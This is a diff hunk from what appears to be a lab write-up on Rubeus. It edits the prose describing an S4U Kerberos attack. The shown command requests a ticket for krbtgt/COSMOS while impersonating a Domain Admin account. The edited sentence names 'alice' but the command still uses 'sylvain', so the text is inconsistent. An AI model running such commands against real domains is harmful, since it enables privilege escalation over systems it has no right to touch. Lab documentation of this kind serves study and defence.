@@ -162,7 +162,7 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgt /user:SA-TEST-01 /domain:C
 
 ## s4u impersonate sylvain on krbtgt service
 
-Then we will perform a s4u attack by asking to impersonate a privileged account (here sylvain is *Domain Admin*).
+Then we will perform a `s4u` attack by asking to impersonate a privileged account (here alice is *Domain Admin*).
 
 ```
 c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domain:COSMOS /dc=127.0.0.1 /impersonateuser:sylvain /ticket:sa_tgt /outfile:sylvain
